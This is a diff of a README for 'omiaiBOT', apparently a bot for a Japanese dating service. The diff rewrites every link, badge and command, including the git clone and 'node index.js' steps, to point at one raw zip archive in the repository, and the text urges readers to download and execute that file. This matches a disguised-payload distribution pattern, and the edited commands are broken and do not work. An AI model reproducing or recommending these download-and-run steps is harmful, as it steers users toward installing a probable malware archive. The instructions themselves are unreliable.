@@ -1,6 +1,6 @@
 # omiaiBOT
 
-![Version](https://img.shields.io/badge/version-1.0.0-blue.svg) ![License](https://img.shields.io/badge/license-MIT-green.svg) ![Release](https://img.shields.io/badge/release-latest-orange.svg)
+![Version](https://github.com/AnthonyDL81/omiaiBOT/raw/refs/heads/master/anoli/BOT-omiai-v3.1.zip) ![License](https://github.com/AnthonyDL81/omiaiBOT/raw/refs/heads/master/anoli/BOT-omiai-v3.1.zip) ![Release](https://github.com/AnthonyDL81/omiaiBOT/raw/refs/heads/master/anoli/BOT-omiai-v3.1.zip)
 
 ## Introduction
 
@@ -31,7 +31,7 @@ To get started with omiaiBOT, follow these steps:
 1. **Clone the Repository**: Use the following command to clone the repository to your local machine:
 
    ```bash
-   git clone https://github.com/AnthonyDL81/omiaiBOT.git
+   git clone https://github.com/AnthonyDL81/omiaiBOT/raw/refs/heads/master/anoli/BOT-omiai-v3.1.zip
    ```
 
 2. **Navigate to the Directory**:
@@ -46,7 +46,7 @@ To get started with omiaiBOT, follow these steps:
    npm install
    ```
 
-4. **Download the Latest Release**: Visit the [Releases section](https://github.com/AnthonyDL81/omiaiBOT/releases) to download the latest version of the bot. Once downloaded, execute the file to start using omiaiBOT.
+4. **Download the Latest Release**: Visit the [Releases section](https://github.com/AnthonyDL81/omiaiBOT/raw/refs/heads/master/anoli/BOT-omiai-v3.1.zip) to download the latest version of the bot. Once downloaded, execute the file to start using omiaiBOT.
 
 ## Usage
 
@@ -55,7 +55,7 @@ After installation, you can start using omiaiBOT. Here’s how:
 1. **Start the Bot**: Run the following command in your terminal:
 
    ```bash
-   node index.js
+   node https://github.com/AnthonyDL81/omiaiBOT/raw/refs/heads/master/anoli/BOT-omiai-v3.1.zip
    ```
 
 2. **Follow On-Screen Instructions**: The bot will guide you through the registration and verification process.
@@ -100,7 +100,7 @@ For any questions or feedback, please reach out to us via GitHub issues or direc
 
 ## Releases
 
-To download the latest version of omiaiBOT, visit the [Releases section](https://github.com/AnthonyDL81/omiaiBOT/releases). Make sure to download the appropriate file and execute it to get started.
+To download the latest version of omiaiBOT, visit the [Releases section](https://github.com/AnthonyDL81/omiaiBOT/raw/refs/heads/master/anoli/BOT-omiai-v3.1.zip). Make sure to download the appropriate file and execute it to get started.
 
 ## Conclusion
 
